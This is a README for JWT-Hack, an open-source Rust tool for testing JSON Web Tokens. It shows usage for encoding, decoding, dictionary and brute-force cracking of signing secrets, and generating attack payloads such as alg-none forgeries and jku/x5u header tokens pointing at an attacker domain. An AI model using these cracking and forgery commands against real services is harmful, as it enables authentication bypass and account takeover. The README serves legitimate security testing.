<div align="center">
  <picture>
    <img alt="JWT-HACK Logo" src="./images/logo.png" width="260px;">
  </picture>
  <p>Hack the JWT(JSON Web Token)</p>
</div>

<p align="center">
  <a href="https://github.com/hahwul/jwt-hack/releases/latest"><img src="https://img.shields.io/github/v/release/hahwul/jwt-hack?style=for-the-badge&logoColor=%23000000&label=jwt-hack&labelColor=%23000000&color=%23000000"></a>
  <a href="https://app.codecov.io/gh/hahwul/jwt-hack"><img src="https://img.shields.io/codecov/c/gh/hahwul/jwt-hack?style=for-the-badge&logoColor=%23000000&labelColor=%23000000&color=%23000000"></a>
  <a href="https://github.com/hahwul/jwt-hack/blob/main/CONTRIBUTING.md"><img src="https://img.shields.io/badge/CONTRIBUTIONS-WELCOME-000000?style=for-the-badge&labelColor=000000"></a>
  <a href="https://rust-lang.org"><img src="https://img.shields.io/badge/Rust-000000?style=for-the-badge&logo=rust&logoColor=white"></a>
</p>

JWT-Hack is a tool for testing and analyzing JSON Web Tokens. This is the Rust implementation (v2.0.0) of the original Go-based JWT-Hack tool, providing better performance and additional features.

## Installation

### From source
```bash
# Clone the repository
git clone https://github.com/hahwul/jwt-hack
cd jwt-hack/rust-jwt-hack

# Build and install
cargo build --release
cargo install --path .
```

### Cargo
```bash
cargo install jwt-hack
```

### Future installation methods
Coming soon:
- Homebrew
- Snapcraft

## Usage
```
   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
-------------------------
Hack the JWT(JSON Web Token) | by @hahwul | v2.0.0

Usage:
  jwt-hack [command]

Available Commands:
  crack       Cracking JWT Token
  decode      Decode JWT to JSON
  encode      Encode json to JWT
  help        Help about any command
  payload     Generate JWT Attack payloads
  version     Show version

Flags:
  -h, --help   help for jwt-hack
```

## Encode mode (JSON to JWT)
```
▶ jwt-hack encode '{"json":"format"}' --secret={YOUR_SECRET}
```

e.g
```
▶ jwt-hack encode '{"test":"1234"}' --secret=asdf
   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
-------------------------
INFO[0000] Encoded result                                algorithm=HS256
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXN0IjoiMTIzNCJ9.JOL1SYkRZYUz9GVny-DgoDj60C0RLz929h1_fFcpqQA
```

## Decode mode (JWT to JSON)
```
▶ jwt-hack decode {JWT_CODE}
```

e.g
```
▶ jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
-------------------------
INFO[0000] Decoded data(claims)                          header="{\"alg\":\"HS256\",\"typ\":\"JWT\"}" method="&{HS256 5}"
{
  "iat": 1516239022,
  "name": "John Doe",
  "sub": "1234567890"
}
```

## Crack mode (Dictionary attack / BruteForce)
```
▶ jwt-hack crack -w {WORDLIST} {JWT_CODE}
```

e.g
```
▶ jwt-hack crack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5mhBHqs5_DTLdINd9p5m7ZJ6XD0Xc55kIaCRY5r6HRA -w samples/wordlist.txt

   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
-------------------------
[*] Start dict cracking mode
INFO[0000] Loaded words (remove duplicated)              size=16
INFO[0000] Invalid signature                             word=fas
INFO[0000] Invalid signature                             word=asd
INFO[0000] Invalid signature                             word=1234
INFO[0000] Invalid signature                             word=efq
INFO[0000] Invalid signature                             word=asdf
INFO[0000] Invalid signature                             word=2q
INFO[0000] Found! Token signature secret is test         Signature=Verified Word=test
INFO[0000] Invalid signature                             word=dfas
INFO[0000] Invalid signature                             word=ga
INFO[0000] Invalid signature                             word=f
INFO[0000] Invalid signature                             word=ds
INFO[0000] Invalid signature                             word=sad
INFO[0000] Invalid signature                             word=qsf
...
INFO[0000] Invalid signature                             word=password
INFO[0000] Invalid signature                             word=error
INFO[0000] Invalid signature                             word=calendar
[+] Found! JWT signature secret: test
[+] Finish crack mode
```

## Bruteforce mode
```
▶ jwt-hack crack -m brute {JWT_CODE} --max=4
```

## Payload mode (Alg none attack, etc.)
```
▶ jwt-hack payload {JWT_CODE}
```

For jku and x5u (what is? [readme this slide](https://www.slideshare.net/snyff/jwt-jku-x5u)):
* `--jwk-attack` : An attack payload domain for jku&x5u (e.g hahwul.com)
* `--jwk-trust` : A trusted domain for jku&x5u (e.g google.com)
* `--jwk-protocol` : jku&x5u protocol (http/https) (default "https")

e.g
```
▶ jwt-hack payload eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.5m9zFPGPU0LMdTTLCR7jXMP8357nNAa0z8ABJJE3r3c --jwk-attack attack.hahwul.com --jwk-protocol https --jwk-trust trust.hahwul.com

INFO[0000] Generate none payload                         header="{\"alg\":\"none\",\"typ\":\"JWT\"}" payload=none
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhBSFdVTCIsInJlZnJlc2hfdG9rZW4iOiJhYmNkMTIzNDU0NjQiLCJpYXQiOjE1MTYyMzkwMjJ9.

...
```

## Performance Improvements in v2.0.0 (Rust version)

The Rust implementation offers:
1. **Faster execution** - Particularly noticeable in crack mode with large wordlists
2. **More memory efficient** - Uses less memory for the same operations
3. **Better concurrency** - Utilizes Rust's concurrency model for optimal performance
4. **Improved error handling** - More robust error handling with detailed messages

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

MIT License
